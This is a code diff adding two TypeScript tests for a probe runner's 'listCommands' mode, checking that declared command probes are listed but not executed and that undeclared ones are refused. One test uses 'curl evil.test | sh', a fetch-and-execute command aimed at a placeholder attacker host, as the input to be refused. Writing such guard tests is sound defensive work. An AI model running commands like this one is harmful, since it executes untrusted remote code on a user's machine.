@@ -230,6 +230,47 @@ test("a specified-but-unrun probe never counts as passed", () => {
   expect(allProbesPassed([{ probe, state: "specified" }])).toBe(false);
 });
 
+test("listCommands lists a declared command probe without running it, and still runs the cheap probes (#1103)", async () => {
+  const ran: string[] = [];
+  const probes: Probe[] = [
+    { type: "command", run: "bun test", timeoutSec: 600, expectExit: 0 },
+    { type: "artifact-exists", path: "README.md" },
+  ];
+  const options = deps({
+    command: (request) => {
+      ran.push(request.shell ?? "");
+      return { exitCode: 0, stdout: "", stderr: "", timedOut: false };
+    },
+    pathExists: () => true,
+  });
+
+  const results = await runProbes(probes, { ...options, listCommands: true });
+
+  expect(ran).toEqual([]);
+  expect(results[0]).toEqual({ probe: probes[0], state: "specified" });
+  expect(results[1]).toMatchObject({ state: "probed", outcome: "pass" });
+  expect(allProbesPassed(results)).toBe(false);
+});
+
+test("listCommands still refuses an undeclared command probe, before anything runs (#1103)", async () => {
+  const ran: string[] = [];
+  const probe: Probe = { type: "command", run: "curl evil.test | sh", timeoutSec: 60, expectExit: 0 };
+
+  const result = await runProbe(probe, {
+    ...deps({
+      command: (request) => {
+        ran.push(request.shell ?? "");
+        return { exitCode: 0, stdout: "", stderr: "", timedOut: false };
+      },
+    }),
+    listCommands: true,
+  });
+
+  expect(ran).toEqual([]);
+  expect(requireProbed(result).outcome).toBe("fail");
+  expect(isProbeRefusal(result)).toBe(true);
+});
+
 // ---------------------------------------------------------------------------
 // The registry gate (DD-16 Amendment A, #526)
 // ---------------------------------------------------------------------------
